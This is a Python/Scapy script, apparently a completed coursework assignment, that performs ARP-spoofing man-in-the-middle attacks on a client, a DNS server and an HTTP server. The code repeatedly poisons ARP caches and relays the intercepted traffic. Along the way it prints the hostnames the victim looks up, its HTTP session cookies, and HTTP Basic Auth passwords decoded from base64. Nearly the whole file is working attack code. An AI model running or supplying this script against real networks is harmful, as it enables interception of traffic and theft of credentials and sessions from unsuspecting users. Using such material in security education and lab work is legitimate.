from scapy.all import *

import argparse
import sys
import threading
import time
import base64

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--dnsIP", help="IP of the dns server", required=True)
    parser.add_argument("-ip3", "--httpIP", help="IP of the http server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()

def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=IP), retry=2, timeout=5)
    for s,r in resp:
        #print(r[ARP].hwsrc)
        return r[ARP].hwsrc
    return None
#ARP spoofs client, httpServer, dnsServer
def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC, interval=3):
    while True:
        spoof(httpServerIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, httpServerIP, httpServerMAC) # Spoof httpServer ARP table
        spoof(dnsServerIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, dnsServerIP, dnsServerMAC) # Spoof dnsServer ARP table
        time.sleep(interval)

# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(src_ip, src_mac, dst_ip, dst_mac):
    debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
    kwargs = {
            'op':2,
            'pdst':dst_ip,
            'psrc':src_ip,
            'hwdst':"ff:ff:ff:ff:ff:ff",
            }
    if src_mac is not None:
        kwargs['hwsrc'] = src_mac
    send(ARP(**kwargs), count = 5)
    


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=dstIP, hwsrc=srcMAC, psrc=srcIP), count=5)

# TODO: handle intercepted packets
def interceptor(packet):
    global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
    
    #print(packet[Ether].src,packet[Ether].dst)
    #print(packet[0].summary)


    if IP in packet:
        if packet[Ether].src==attackerMAC:
            return
        elif packet[IP].dst==dnsServerIP:
            print("*hostname:",packet["DNS Question Record"].qname.decode("utf-8"))
            packet2 = packet
            packet2[Ether].dst = dnsServerMAC
            packet2[Ether].src = attackerMAC
            sendp(packet2)
        elif packet[IP].dst==clientIP:
            packet2 = packet
            packet2[Ether].dst = clientMAC
            packet2[Ether].src = attackerMAC
            sendp(packet2)
            if DNS in packet and "DNS Resource Record" in packet:
                if type(packet[DNS]["DNS Resource Record"].rdata)==str:
                    print("*hostaddr:",packet[DNS]["DNS Resource Record"].rdata)
            elif Raw in packet:
                temp = packet[Raw].load.decode("utf-8")
                cookie = temp[(temp.find("Cookie")+16):temp.find("Accept")-2]
                print("*cookie:",cookie)
        elif packet[IP].dst==httpServerIP:
            packet2 = packet
            packet2[Ether].dst = httpServerMAC
            packet2[Ether].src = attackerMAC
            sendp(packet2)
            if Raw in packet:
                temp = packet[Raw].load.decode("utf-8")
                if temp.find("Basic")>0:
                    basicAuth = temp[(temp.find("Basic")+6):temp.find("User")-2]
                    password = base64.b64decode(basicAuth)
                    print("*basicauth:",password.decode("utf-8"))
                #print("*basicauth:",m.digest().decode("utf-8"))
        #elif packet[IP].src==httpServerIP and packet[IP].dst==clientIP:
#            packet2 = packet
#            packet2[Ether].dst = clientMAC 
#            packet2[Ether].src = attackerMAC
#            sendp(packet2)


                #packet.show()
                #print("Raw in packet:",packet[Raw])
            string = str(packet)    
            #print("From HTTP to client ending......")


if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    httpServerIP = args.httpIP
    dnsServerIP = args.dnsIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    httpServerMAC = mac(httpServerIP)
    dnsServerMAC = mac(dnsServerIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
        restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
        restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
        restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
    restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
    restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
    restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
